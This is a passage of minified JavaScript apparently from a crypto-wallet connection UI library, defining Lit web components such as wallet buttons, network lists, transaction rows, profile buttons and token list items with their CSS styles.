        ${this.leftViewTemplate()} ${this.rightViewTemplate()}
      </button>
    `}leftViewTemplate(){return this.error?F`<wui-icon-box
        icon="warningCircle"
        iconColor="error-100"
        backgroundColor="error-100"
        size="sm"
        iconSize="xs"
      ></wui-icon-box>`:this.loading?F`<wui-loading-spinner size="md" color="fg-100"></wui-loading-spinner>`:this.icon?F`<wui-icon size="xl" color="inherit" name=${this.icon}></wui-icon>`:this.imageSrc?F`<wui-image src=${this.imageSrc} alt=${this.name}></wui-image>`:F`<wui-icon size="xl" color="fg-100" name="walletPlaceholder"></wui-icon>`}rightViewTemplate(){return F`
      <wui-text variant="paragraph-500" color="fg-100">${this.name||"Unknown"} </wui-text>
    `}};cl.styles=[ht,fr,jRe];O0([V()],cl.prototype,"imageSrc",void 0);O0([V()],cl.prototype,"name",void 0);O0([V({type:Boolean})],cl.prototype,"walletConnect",void 0);O0([V({type:Boolean})],cl.prototype,"icon",void 0);O0([V({type:Boolean})],cl.prototype,"loading",void 0);O0([V({type:Boolean})],cl.prototype,"error",void 0);O0([V({type:Boolean})],cl.prototype,"disabled",void 0);O0([V({type:Boolean})],cl.prototype,"shake",void 0);cl=O0([me("wui-wallet-button")],cl);const FRe=ge`
  :host {
    display: block;
  }

  button {
    width: 100%;
    display: block;
    padding-top: var(--wui-spacing-l);
    padding-bottom: var(--wui-spacing-l);
    padding-left: var(--wui-spacing-s);
    padding-right: var(--wui-spacing-2l);
    border-radius: var(--wui-border-radius-s);
    background-color: var(--wui-color-accent-glass-010);
  }

  button:hover {
    background-color: var(--wui-color-accent-glass-015) !important;
  }

  button:active {
    background-color: var(--wui-color-accent-glass-020) !important;
  }
`;var TC=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let lg=class extends he{constructor(){super(...arguments),this.label="",this.description="",this.icon="wallet"}render(){return F`
      <button>
        <wui-flex gap="m" alignItems="center" justifyContent="space-between">
          <wui-icon-box
            size="lg"
            iconcolor="accent-100"
            backgroundcolor="accent-100"
            icon=${this.icon}
            background="transparent"
          ></wui-icon-box>

          <wui-flex flexDirection="column" gap="3xs">
            <wui-text variant="paragraph-500" color="fg-100">${this.label}</wui-text>
            <wui-text variant="small-400" color="fg-200">${this.description}</wui-text>
          </wui-flex>

          <wui-icon size="md" color="fg-200" name="chevronRight"></wui-icon>
        </wui-flex>
      </button>
    `}};lg.styles=[ht,fr,FRe];TC([V()],lg.prototype,"label",void 0);TC([V()],lg.prototype,"description",void 0);TC([V()],lg.prototype,"icon",void 0);lg=TC([me("wui-notice-card")],lg);const qRe=ge`
  button {
    height: auto;
    position: relative;
    flex-direction: column;
    gap: var(--wui-spacing-s);
    padding: 17px 18px 17px var(--wui-spacing-m);
    width: 100%;
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
    color: var(--wui-color-fg-250);
  }

  .overflowedContent {
    width: 100%;
    overflow: hidden;
  }

  .overflowedContent[data-active='false']:after {
    content: '';
    position: absolute;
    top: 50%;
    left: 0;
    right: 0;
    bottom: 0;
    background: linear-gradient(to top, var(--wui-color-bg-150), transparent);
    border-bottom-left-radius: var(--wui-border-radius-xs);
    border-bottom-right-radius: var(--wui-border-radius-xs);
  }

  .heightContent {
    max-height: 100px;
  }

  pre {
    text-align: left;
    white-space: pre-wrap;
    height: auto;
    overflow-x: auto;
    overflow-wrap: anywhere;
  }
`;var qR=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const OA=100;let Fw=class extends he{constructor(){super(...arguments),this.textTitle="",this.overflowedContent="",this.toggled=!1,this.enableAccordion=!1,this.scrollElement=void 0,this.scrollHeightElement=0}updated(e){super.updated(e),(e.has("textTitle")||e.has("overflowedContent"))&&setTimeout(()=>{this.checkHeight()},1)}checkHeight(){this.updateComplete.then(()=>{const e=this.shadowRoot?.querySelector(".heightContent"),t=this.shadowRoot?.querySelector(".textContent");if(e&&t){this.scrollElement=e;const i=t?.scrollHeight;i&&i>OA&&(this.enableAccordion=!0,this.scrollHeightElement=i,this.requestUpdate())}})}render(){return F`
      <button @click=${()=>this.onClick()}>
        <wui-flex justifyContent="space-between" alignItems="center">
          <wui-text variant="paragraph-500" color="fg-100">${this.textTitle}</wui-text>
          ${this.chevronTemplate()}
        </wui-flex>
        <div
          data-active=${this.enableAccordion?!!this.toggled:!0}
          class="overflowedContent"
        >
          <div class="heightContent">
            <wui-text class="textContent" variant="paragraph-400" color="fg-200">
              <pre>${this.overflowedContent}</pre>
            </wui-text>
          </div>
        </div>
      </button>
    `}onClick(){const e=this.shadowRoot?.querySelector("wui-icon");this.enableAccordion&&(this.toggled=!this.toggled,this.requestUpdate(),this.scrollElement&&this.scrollElement.animate([{maxHeight:this.toggled?`${OA}px`:`${this.scrollHeightElement}px`},{maxHeight:this.toggled?`${this.scrollHeightElement}px`:`${OA}px`}],{duration:300,fill:"forwards",easing:"ease"}),e&&e.animate([{transform:this.toggled?"rotate(0deg)":"rotate(180deg)"},{transform:this.toggled?"rotate(180deg)":"rotate(0deg)"}],{duration:300,fill:"forwards",easing:"ease"}))}chevronTemplate(){return this.enableAccordion?F` <wui-icon color="fg-100" size="sm" name="chevronBottom"></wui-icon>`:null}};Fw.styles=[ht,fr,qRe];qR([V()],Fw.prototype,"textTitle",void 0);qR([V()],Fw.prototype,"overflowedContent",void 0);Fw=qR([me("wui-list-accordion")],Fw);const zRe=ge`
  :host {
    display: flex;
    column-gap: var(--wui-spacing-s);
    padding: 17px 18px 17px var(--wui-spacing-m);
    width: 100%;
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
    color: var(--wui-color-fg-250);
  }

  wui-image {
    width: var(--wui-icon-size-lg);
    height: var(--wui-icon-size-lg);
    border-radius: var(--wui-border-radius-3xl);
  }

  wui-icon {
    width: var(--wui-icon-size-lg);
    height: var(--wui-icon-size-lg);
  }
`;var kC=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let ug=class extends he{constructor(){super(...arguments),this.imageSrc=void 0,this.textTitle="",this.textValue=void 0}render(){return F`
      <wui-flex justifyContent="space-between" alignItems="center">
        <wui-text variant="paragraph-500" color=${this.textValue?"fg-200":"fg-100"}>
          ${this.textTitle}
        </wui-text>
        ${this.templateContent()}
      </wui-flex>
    `}templateContent(){return this.imageSrc?F`<wui-image src=${this.imageSrc} alt=${this.textTitle}></wui-image>`:this.textValue?F` <wui-text variant="paragraph-400" color="fg-100"> ${this.textValue} </wui-text>`:F`<wui-icon size="inherit" color="fg-200" name="networkPlaceholder"></wui-icon>`}};ug.styles=[ht,fr,zRe];kC([V()],ug.prototype,"imageSrc",void 0);kC([V()],ug.prototype,"textTitle",void 0);kC([V()],ug.prototype,"textValue",void 0);ug=kC([me("wui-list-content")],ug);const WRe=ge`
  button {
    column-gap: var(--wui-spacing-s);
    padding: 7px var(--wui-spacing-l) 7px var(--wui-spacing-xs);
    width: 100%;
    transition: all var(--wui-ease-out-power-1) var(--wui-duration-md);
    border-radius: var(--wui-border-radius-xs);
    color: var(--wui-color-fg-100);
  }

  button > wui-text:nth-child(2) {
    display: flex;
    flex: 1;
  }

  button[data-transparent='true'] {
    pointer-events: none;
    background-color: transparent;
  }

  button:hover {
    background-color: var(--wui-color-gray-glass-002);
  }

  button:active {
    background-color: var(--wui-color-gray-glass-005);
  }

  wui-image {
    width: var(--wui-spacing-3xl);
    height: var(--wui-spacing-3xl);
    border-radius: 100%;
  }

  button:disabled {
    background-color: var(--wui-color-gray-glass-002);
    opacity: 0.5;
    cursor: not-allowed;
  }

  button:disabled > wui-tag {
    background-color: var(--wui-color-gray-glass-010);
    color: var(--wui-color-fg-300);
  }
`;var T3=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let f0=class extends he{constructor(){super(...arguments),this.imageSrc="",this.name="",this.disabled=!1,this.selected=!1,this.transparent=!1}render(){return F`
      <button data-transparent=${this.transparent} ?disabled=${this.disabled}>
        <wui-flex gap="s" alignItems="center">
          ${this.templateNetworkImage()}
          <wui-text variant="paragraph-500" color="inherit">${this.name}</wui-text></wui-flex
        >
        ${this.checkmarkTemplate()}
      </button>
    `}checkmarkTemplate(){return this.selected?F`<wui-icon size="sm" color="accent-100" name="checkmarkBold"></wui-icon>`:null}templateNetworkImage(){return this.imageSrc?F`<wui-image size="sm" src=${this.imageSrc} name=${this.name}></wui-image>`:this.imageSrc?null:F`<wui-network-image
        ?round=${!0}
        size="md"
        name=${this.name}
      ></wui-network-image>`}};f0.styles=[ht,fr,WRe];T3([V()],f0.prototype,"imageSrc",void 0);T3([V()],f0.prototype,"name",void 0);T3([V({type:Boolean})],f0.prototype,"disabled",void 0);T3([V({type:Boolean})],f0.prototype,"selected",void 0);T3([V({type:Boolean})],f0.prototype,"transparent",void 0);f0=T3([me("wui-list-network")],f0);const HRe=ge`
  :host {
    display: flex;
    flex-direction: column;
    gap: var(--wui-spacing-l);
    padding: 17px 18px 17px var(--wui-spacing-m);
    width: 100%;
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
    color: var(--wui-color-fg-250);
  }

  wui-image {
    width: var(--wui-icon-size-lg);
    height: var(--wui-icon-size-lg);
    border-radius: var(--wui-border-radius-3xl);
  }

  wui-icon {
    width: var(--wui-icon-size-lg);
    height: var(--wui-icon-size-lg);
  }
`;var k3=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let p0=class extends he{constructor(){super(...arguments),this.amount="",this.networkCurreny="",this.networkImageUrl="",this.receiverAddress="",this.addressExplorerUrl=""}render(){return F`
      <wui-flex justifyContent="space-between" alignItems="center">
        <wui-text variant="paragraph-500" color="fg-200">Sending</wui-text>
        <wui-flex gap="xs" alignItems="center">
          <wui-text variant="paragraph-400" color="fg-100">
            ${this.amount} ${this.networkCurreny}
          </wui-text>
          ${this.templateNetworkVisual()}
        </wui-flex>
      </wui-flex>
      <wui-flex justifyContent="space-between" alignItems="center">
        <wui-text variant="paragraph-500" color="fg-200">To</wui-text>
        <wui-chip
          icon="externalLink"
          variant="shadeSmall"
          href=${this.addressExplorerUrl}
          title=${this.receiverAddress}
        ></wui-chip>
      </wui-flex>
    `}templateNetworkVisual(){return this.networkImageUrl?F`<wui-image src=${this.networkImageUrl} alt="Network Image"></wui-image>`:F`<wui-icon size="inherit" color="fg-200" name="networkPlaceholder"></wui-icon>`}};p0.styles=[ht,fr,HRe];k3([V()],p0.prototype,"amount",void 0);k3([V()],p0.prototype,"networkCurreny",void 0);k3([V()],p0.prototype,"networkImageUrl",void 0);k3([V()],p0.prototype,"receiverAddress",void 0);k3([V()],p0.prototype,"addressExplorerUrl",void 0);p0=k3([me("wui-list-wallet-transaction")],p0);const VRe=ge`
  button {
    display: flex;
    gap: var(--wui-spacing-3xs);
    align-items: center;
    padding: 6.25px var(--wui-spacing-xs) 7.25px var(--wui-spacing-s);
    background-color: var(--wui-color-gray-glass-090);
    border-radius: var(--wui-border-radius-3xl);
    border: 1px solid var(--wui-color-gray-glass-060);
    transition: background-color var(--wui-duration-md) var(--wui-ease-inout-power-1);
    will-change: background-color;
  }

  @media (hover: hover) and (pointer: fine) {
    button:hover:enabled {
      background-color: var(--wui-color-gray-glass-080);
    }

    button:active:enabled {
      background-color: var(--wui-color-gray-glass-060);
    }
  }
`;var $ee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let ry=class extends he{constructor(){super(...arguments),this.text=""}render(){return F`<button>
      <wui-text variant="small-600" color="bg-100">${this.text}</wui-text>
      <wui-icon color="bg-100" size="xs" name="arrowRight"></wui-icon>
    </button>`}};ry.styles=[ht,fr,VRe];$ee([V()],ry.prototype,"text",void 0);ry=$ee([me("wui-promo")],ry);const KRe=ge`
  span {
    font-weight: 500;
    font-size: 40px;
    color: var(--wui-color-fg-100);
    line-height: 130%; /* 52px */
    letter-spacing: -1.6px;
    text-align: center;
  }

  .pennies {
    color: var(--wui-color-fg-200);
  }
`;var zR=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let qw=class extends he{constructor(){super(...arguments),this.dollars="0",this.pennies="00"}render(){return F`<span>$${this.dollars}<span class="pennies">.${this.pennies}</span></span>`}};qw.styles=[ht,KRe];zR([V()],qw.prototype,"dollars",void 0);zR([V()],qw.prototype,"pennies",void 0);qw=zR([me("wui-balance")],qw);const GRe=ge`
  button {
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-3xl);
    border: 1px solid var(--wui-color-gray-glass-002);
    padding: var(--wui-spacing-xs) var(--wui-spacing-s) var(--wui-spacing-xs) var(--wui-spacing-xs);
    position: relative;
  }

  wui-avatar {
    width: 32px;
    height: 32px;
    box-shadow: 0 0 0 0;
    outline: 3px solid var(--wui-color-gray-glass-005);
  }

  wui-icon-box,
  wui-image {
    width: 16px;
    height: 16px;
    border-radius: var(--wui-border-radius-3xl);
    position: absolute;
    left: 26px;
    top: 24px;
  }

  wui-image {
    outline: 2px solid var(--wui-color-bg-125);
  }

  wui-icon-box {
    outline: 2px solid var(--wui-color-bg-200);
    background-color: var(--wui-color-bg-250);
  }
`;var N3=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let g0=class extends he{constructor(){super(...arguments),this.networkSrc=void 0,this.avatarSrc=void 0,this.profileName="",this.address="",this.icon="chevronBottom"}render(){return F`<button data-testid="wui-profile-button">
      <wui-flex gap="xs" alignItems="center">
        <wui-avatar
          .imageSrc=${this.avatarSrc}
          alt=${this.address}
          address=${this.address}
        ></wui-avatar>
        ${this.networkImageTemplate()}
        <wui-flex gap="xs" alignItems="center">
          <wui-text variant="large-600" color="fg-100">
            ${Wt.getTruncateString({string:this.profileName||this.address,charsStart:this.profileName?18:4,charsEnd:this.profileName?0:4,truncate:this.profileName?"end":"middle"})}
          </wui-text>
          <wui-icon size="sm" color="fg-200" name=${this.icon}></wui-icon>
        </wui-flex>
      </wui-flex>
    </button>`}networkImageTemplate(){return this.networkSrc?F`<wui-image src=${this.networkSrc}></wui-image>`:F`
      <wui-icon-box
        size="xxs"
        iconColor="fg-200"
        backgroundColor="bg-100"
        icon="networkPlaceholder"
      ></wui-icon-box>
    `}};g0.styles=[ht,fr,GRe];N3([V()],g0.prototype,"networkSrc",void 0);N3([V()],g0.prototype,"avatarSrc",void 0);N3([V()],g0.prototype,"profileName",void 0);N3([V()],g0.prototype,"address",void 0);N3([V()],g0.prototype,"icon",void 0);g0=N3([me("wui-profile-button")],g0);const ZRe=ge`
  button {
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-3xl);
    border: 1px solid var(--wui-color-gray-glass-002);
    padding: var(--wui-spacing-xs) var(--wui-spacing-s) var(--wui-spacing-xs) var(--wui-spacing-xs);
    position: relative;
  }

  wui-avatar {
    width: 32px;
    height: 32px;
    box-shadow: 0 0 0 0;
    outline: 3px solid var(--wui-color-gray-glass-005);
  }

  wui-icon-box,
  wui-image {
    width: 16px;
    height: 16px;
    border-radius: var(--wui-border-radius-3xl);
    position: absolute;
    left: 26px;
    top: 24px;
  }

  wui-image {
    outline: 2px solid var(--wui-color-bg-125);
  }

  wui-icon-box {
    outline: 2px solid var(--wui-color-bg-200);
    background-color: var(--wui-color-bg-250);
  }
`;var g2=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Ld=class extends he{constructor(){super(...arguments),this.avatarSrc=void 0,this.profileName="",this.address="",this.icon="mail"}render(){const e=re.state.activeChain,i=He.getConnectedConnectorId(e)===Me.CONNECTOR_ID.AUTH;return F`<button data-testid="wui-profile-button" @click=${this.handleClick}>
      <wui-flex gap="xs" alignItems="center">
        <wui-avatar
          .imageSrc=${this.avatarSrc}
          alt=${this.address}
          address=${this.address}
        ></wui-avatar>
        ${i?this.getIconTemplate(this.icon):""}
        <wui-flex gap="xs" alignItems="center">
          <wui-text variant="large-600" color="fg-100">
            ${Wt.getTruncateString({string:this.profileName||this.address,charsStart:this.profileName?18:4,charsEnd:this.profileName?0:4,truncate:this.profileName?"end":"middle"})}
          </wui-text>
          <wui-icon size="sm" color="fg-200" name="copy" id="copy-address"></wui-icon>
        </wui-flex>
      </wui-flex>
    </button>`}handleClick(e){if(e.target instanceof HTMLElement&&e.target.id==="copy-address"){this.onCopyClick?.(e);return}this.onProfileClick?.(e)}getIconTemplate(e){return F`
      <wui-icon-box
        size="xxs"
        iconColor="fg-200"
        backgroundColor="bg-100"
        icon="${e||"networkPlaceholder"}"
      ></wui-icon-box>
    `}};Ld.styles=[ht,fr,ZRe];g2([V()],Ld.prototype,"avatarSrc",void 0);g2([V()],Ld.prototype,"profileName",void 0);g2([V()],Ld.prototype,"address",void 0);g2([V()],Ld.prototype,"icon",void 0);g2([V()],Ld.prototype,"onProfileClick",void 0);g2([V()],Ld.prototype,"onCopyClick",void 0);Ld=g2([me("wui-profile-button-v2")],Ld);const YRe=ge`
  button {
    border: none;
    border-radius: var(--wui-border-radius-3xl);
  }

  button[data-variant='main'] {
    background-color: var(--wui-color-accent-100);
    color: var(--wui-color-inverse-100);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-010);
  }

  button[data-variant='accent'] {
    background-color: var(--wui-color-accent-glass-010);
    color: var(--wui-color-accent-100);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-005);
  }

  button[data-variant='gray'] {
    background-color: transparent;
    color: var(--wui-color-fg-200);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-010);
  }

  button[data-variant='shade'] {
    background-color: transparent;
    color: var(--wui-color-accent-100);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-010);
  }

  button[data-size='sm'] {
    height: 32px;
    padding: 0 var(--wui-spacing-s);
  }

  button[data-size='md'] {
    height: 40px;
    padding: 0 var(--wui-spacing-l);
  }

  button[data-size='sm'] > wui-image {
    width: 16px;
    height: 16px;
  }

  button[data-size='md'] > wui-image {
    width: 24px;
    height: 24px;
  }

  button[data-size='sm'] > wui-icon {
    width: 12px;
    height: 12px;
  }

  button[data-size='md'] > wui-icon {
    width: 14px;
    height: 14px;
  }

  wui-image {
    border-radius: var(--wui-border-radius-3xl);
    overflow: hidden;
  }

  button.disabled > wui-icon,
  button.disabled > wui-image {
    filter: grayscale(1);
  }

  button[data-variant='main'] > wui-image {
    box-shadow: inset 0 0 0 1px var(--wui-color-accent-090);
  }

  button[data-variant='shade'] > wui-image,
  button[data-variant='gray'] > wui-image {
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-010);
  }

  @media (hover: hover) and (pointer: fine) {
    button[data-variant='main']:focus-visible {
      background-color: var(--wui-color-accent-090);
    }

    button[data-variant='main']:hover:enabled {
      background-color: var(--wui-color-accent-090);
    }

    button[data-variant='main']:active:enabled {
      background-color: var(--wui-color-accent-080);
    }

    button[data-variant='accent']:hover:enabled {
      background-color: var(--wui-color-accent-glass-015);
    }

    button[data-variant='accent']:active:enabled {
      background-color: var(--wui-color-accent-glass-020);
    }

    button[data-variant='shade']:focus-visible,
    button[data-variant='gray']:focus-visible,
    button[data-variant='shade']:hover,
    button[data-variant='gray']:hover {
      background-color: var(--wui-color-gray-glass-002);
    }

    button[data-variant='gray']:active,
    button[data-variant='shade']:active {
      background-color: var(--wui-color-gray-glass-005);
    }
  }

  button.disabled {
    color: var(--wui-color-gray-glass-020);
    background-color: var(--wui-color-gray-glass-002);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-002);
    pointer-events: none;
  }
`;var m2=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Ud=class extends he{constructor(){super(...arguments),this.variant="accent",this.imageSrc="",this.disabled=!1,this.icon="externalLink",this.size="md",this.text=""}render(){const e=this.size==="sm"?"small-600":"paragraph-600";return F`
      <button
        class=${this.disabled?"disabled":""}
        data-variant=${this.variant}
        data-size=${this.size}
      >
        ${this.imageSrc?F`<wui-image src=${this.imageSrc}></wui-image>`:null}
        <wui-text variant=${e} color="inherit"> ${this.text} </wui-text>
        <wui-icon name=${this.icon} color="inherit" size="inherit"></wui-icon>
      </button>
    `}};Ud.styles=[ht,fr,YRe];m2([V()],Ud.prototype,"variant",void 0);m2([V()],Ud.prototype,"imageSrc",void 0);m2([V({type:Boolean})],Ud.prototype,"disabled",void 0);m2([V()],Ud.prototype,"icon",void 0);m2([V()],Ud.prototype,"size",void 0);m2([V()],Ud.prototype,"text",void 0);Ud=m2([me("wui-chip-button")],Ud);const JRe=ge`
  button {
    display: flex;
    gap: var(--wui-spacing-xl);
    width: 100%;
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xxs);
    padding: var(--wui-spacing-m) var(--wui-spacing-s);
  }

  wui-text {
    width: 100%;
  }

  wui-flex {
    width: auto;
  }

  .network-icon {
    width: var(--wui-spacing-2l);
    height: var(--wui-spacing-2l);
    border-radius: calc(var(--wui-spacing-2l) / 2);
    overflow: hidden;
    box-shadow:
      0 0 0 3px var(--wui-color-gray-glass-002),
      0 0 0 3px var(--wui-color-modal-bg);
  }
`;var WR=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let zw=class extends he{constructor(){super(...arguments),this.networkImages=[""],this.text=""}render(){return F`
      <button>
        <wui-text variant="small-400" color="fg-200">${this.text}</wui-text>
        <wui-flex gap="3xs" alignItems="center">
          ${this.networksTemplate()}
          <wui-icon name="chevronRight" size="sm" color="fg-200"></wui-icon>
        </wui-flex>
      </button>
    `}networksTemplate(){const e=this.networkImages.slice(0,5);return F` <wui-flex class="networks">
      ${e?.map(t=>F` <wui-flex class="network-icon"> <wui-image src=${t}></wui-image> </wui-flex>`)}
    </wui-flex>`}};zw.styles=[ht,fr,JRe];WR([V({type:Array})],zw.prototype,"networkImages",void 0);WR([V()],zw.prototype,"text",void 0);zw=WR([me("wui-compatible-network")],zw);const QRe=ge`
  wui-flex {
    width: 100%;
    background-color: var(--wui-color-gray-glass-005);
    border-radius: var(--wui-border-radius-s);
    padding: var(--wui-spacing-1xs) var(--wui-spacing-s) var(--wui-spacing-1xs)
      var(--wui-spacing-1xs);
  }
`;var HR=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Ww=class extends he{constructor(){super(...arguments),this.icon="externalLink",this.text=""}render(){return F`
      <wui-flex gap="1xs" alignItems="center">
        <wui-icon-box
          size="sm"
          iconcolor="fg-200"
          backgroundcolor="fg-200"
          icon=${this.icon}
          background="transparent"
        ></wui-icon-box>
        <wui-text variant="small-400" color="fg-200">${this.text}</wui-text>
      </wui-flex>
    `}};Ww.styles=[ht,fr,QRe];HR([V()],Ww.prototype,"icon",void 0);HR([V()],Ww.prototype,"text",void 0);Ww=HR([me("wui-banner")],Ww);const XRe=ge`
  wui-flex {
    width: 100%;
    background-color: var(--wui-color-gray-glass-005);
    border-radius: var(--wui-border-radius-m);
    padding: var(--wui-spacing-1xs) var(--wui-spacing-s) var(--wui-spacing-1xs)
      var(--wui-spacing-1xs);
  }
`;var NC=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let dg=class extends he{constructor(){super(...arguments),this.imageSrc="",this.text="",this.size=""}render(){return F`
      <wui-flex gap="1xs" alignItems="center">
        <wui-avatar size=${this.size} imageSrc=${this.imageSrc}></wui-avatar>
        <wui-text variant="small-400" color="fg-200">${this.text}</wui-text>
      </wui-flex>
    `}};dg.styles=[ht,fr,XRe];NC([V()],dg.prototype,"imageSrc",void 0);NC([V()],dg.prototype,"text",void 0);NC([V()],dg.prototype,"size",void 0);dg=NC([me("wui-banner-img")],dg);const eOe=ge`
  button {
    padding: 6.5px var(--wui-spacing-l) 6.5px var(--wui-spacing-xs);
    display: flex;
    justify-content: space-between;
    width: 100%;
    border-radius: var(--wui-border-radius-xs);
    background-color: var(--wui-color-gray-glass-002);
  }

  button[data-clickable='false'] {
    pointer-events: none;
    background-color: transparent;
  }

  wui-image,
  wui-icon {
    width: var(--wui-spacing-3xl);
    height: var(--wui-spacing-3xl);
  }

  wui-image {
    border-radius: var(--wui-border-radius-3xl);
  }
`;var w2=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let jd=class extends he{constructor(){super(...arguments),this.tokenName="",this.tokenImageUrl="",this.tokenValue=0,this.tokenAmount="0.0",this.tokenCurrency="",this.clickable=!1}render(){return F`
      <button data-clickable=${String(this.clickable)}>
        <wui-flex gap="s" alignItems="center">
          ${this.visualTemplate()}
          <wui-flex flexDirection="column" justifyContent="spaceBetween">
            <wui-text variant="paragraph-500" color="fg-100">${this.tokenName}</wui-text>
            <wui-text variant="small-400" color="fg-200">
              ${Wt.formatNumberToLocalString(this.tokenAmount,4)} ${this.tokenCurrency}
            </wui-text>
          </wui-flex>
        </wui-flex>
        <wui-text variant="paragraph-500" color="fg-100">$${this.tokenValue.toFixed(2)}</wui-text>
      </button>
